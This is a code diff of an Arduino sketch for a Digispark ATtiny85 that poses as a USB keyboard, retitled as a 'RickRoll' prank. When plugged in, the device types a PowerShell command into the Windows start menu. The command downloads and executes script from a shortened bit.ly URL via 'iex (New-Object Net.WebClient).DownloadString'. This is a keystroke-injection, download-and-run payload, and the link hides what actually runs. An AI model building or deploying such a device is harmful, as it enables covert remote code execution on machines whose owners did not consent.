@@ -1,4 +1,4 @@
-//ATTiny85
+//Digispark tiny85 RickRoll
 
 #include "DigiKeyboard.h"
 
@@ -7,24 +7,15 @@ void setup() {
 
   DigiKeyboard.sendKeyStroke(0);
 
-  DigiKeyboard.delay(5000);
+  DigiKeyboard.delay(2000);
 
   DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
-
-  DigiKeyboard.delay(1000);
-
-  DigiKeyboard.print("cmd");
-
-  DigiKeyboard.delay(1000);
-
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   DigiKeyboard.delay(1000);
   
   DigiKeyboard.print("cmd.exe /c powershell iex (New-Object Net.WebClient).DownloadString('http://bit.ly/e0Mw9w')");
 
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  
 
 
 }
